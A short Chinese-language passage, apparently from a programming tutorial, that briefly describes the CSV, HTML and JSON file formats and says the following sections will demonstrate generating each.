  -   字符（或逗号）分隔值（`CSV`）：这些文件易于导入到电子表格等工具中。

  -   超文本标记语言（`HTML`）：用于在网页浏览器中显示页面。

  -   JavaScript 对象表示法（`JSON`）：用于表示结构化数据的标准基于文本的格式，并用于在网页浏览器中传输数据。


  我将在接下来的章节中简要演示生成每种文件类型。



  '
